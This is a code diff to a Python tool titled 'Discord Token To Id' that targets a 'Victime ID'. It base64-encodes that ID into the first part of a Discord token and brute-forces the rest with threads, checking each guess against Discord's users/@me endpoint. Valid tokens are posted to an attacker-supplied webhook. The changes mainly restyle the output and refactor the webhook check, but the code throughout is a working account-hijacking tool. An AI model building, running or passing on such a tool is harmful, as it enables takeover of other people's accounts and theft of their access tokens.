@@ -22,35 +22,26 @@ except Exception as e:
    
 Title("Discord Token To Id")
 try:
-    userid = input(f"{color.RED}\n{INPUT} Victime ID -> {color.RESET}")
+    userid = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Victime ID -> {reset}")
     OnePartToken =  str(base64.b64encode(userid.encode("utf-8")), "utf-8")
     motifs = ["=", "==", "==="]
     for motif in motifs:
         if OnePartToken.endswith(motif):
             OnePartToken = OnePartToken[:-2]
-    print(f'{color.RED}{INFO} Part One Token: {color.WHITE}{OnePartToken}.{color.RED}{color.RESET}')
+    print(f'{BEFORE + current_time_hour() + AFTER} {INFO} Part One Token: {white}{OnePartToken}.{reset}')
 
-    brute = input(f"{color.RED}{INPUT} Find the second part by brute force ? (y/n) -> {color.RESET}")
-    if brute in ['y', 'Y', 'Yes', 'yes', 'YES']:
-        pass
-    else:
+    brute = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Find the second part by brute force ? (y/n) -> {reset}")
+    if not brute in ['y', 'Y', 'Yes', 'yes', 'YES']:
         Continue()
         Reset()
 
-    webhook = input(f"{color.RED}{INPUT} Webhook ? (y/n) -> {color.RESET}")
+    webhook = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {reset}")
     if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
-        webhook_url = input(f"{color.RED}{INPUT} Webhook URL -> {color.RESET}")
-        try:
-            response = requests.head(webhook_url)
-            if response.status_code != 200:
-                ErrorWebhook()
-            else:
-                print(f"{color.RED}{INFO} Webhook Valid.")
-        except:
-            ErrorWebhook()
+        webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
+        CheckWebhook(webhook_url)
 
     try:
-        threads_number = int(input(f"{INPUT} Threads Number -> {color.RESET}"))
+        threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
     except:
         ErrorNumber()
 
@@ -75,13 +66,12 @@ try:
         token = f"{first}.{second}.{third}"
 
         try:
-            try:
-                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
-                user['username']
+            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
+            if response.status_code == 200:
                 if webhook in ['y']:
                     embed_content = {
                     'title': f'Token Valid !',
-                    'description': f"**__Token:__**\n```{token}```",
+                    'description': f"**Token:**\n```{token}```",
                     'color': color_webhook,
                     'footer': {
                     "text": username_webhook,
@@ -89,13 +79,13 @@ try:
                     }
                     }
                     send_webhook(embed_content)
-                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
+                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                 else:
-                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
-            except:
-                print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} | Token: {color.WHITE}{token}{color.RED}")
+                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
+            else:
+                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Token: {white}{token}{red}")
         except:
-            print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Error{color.RED} | Token: {color.WHITE}{token}{color.RED}")
+            print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Error{red} Token: {white}{token}{red}")
 
     def request():
         threads = []
